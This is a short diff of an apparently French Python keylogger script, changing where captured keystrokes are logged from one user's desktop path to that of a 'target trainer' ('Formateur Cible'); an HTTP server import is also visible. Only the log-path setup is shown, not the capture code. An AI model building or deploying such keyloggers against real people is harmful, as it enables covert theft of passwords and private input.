@@ -11,7 +11,7 @@ from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
 # Fichier de logs contenant les frappes
 # ---------------------------------------------------------------------------
 
-log_filename = rf"C:\Users\Alexis\Desktop\Aurelien\keylog_{datetime.now().strftime('%Y-%m-%d')}.txt"
+log_filename = rf"C:\Users\Formateur Cible\Desktop\keylog_{datetime.now().strftime('%Y-%m-%d')}.txt"
 
 logging.basicConfig(
     filename=log_filename,
